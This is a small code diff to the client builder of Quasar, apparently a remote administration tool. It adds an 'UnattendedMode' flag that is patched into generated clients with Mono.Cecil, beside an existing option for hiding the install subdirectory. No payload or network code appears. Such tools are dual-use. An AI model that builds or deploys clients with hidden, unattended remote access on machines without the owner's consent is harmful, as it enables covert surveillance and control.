@@ -1,7 +1,6 @@
 ﻿using Mono.Cecil;
 using Mono.Cecil.Cil;
 using Quasar.Common.Cryptography;
-using Quasar.Common.Helpers;
 using Quasar.Server.Models;
 using System;
 using System.Security.Cryptography;
@@ -169,6 +168,9 @@ namespace Quasar.Server.Build
                                             break;
                                         case 6: // HideInstallSubdirectory
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
+                                            break;
+                                        case 7: // UnattendedMode
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UnattendedMode));
                                             break;
                                     }
                                     bools++;
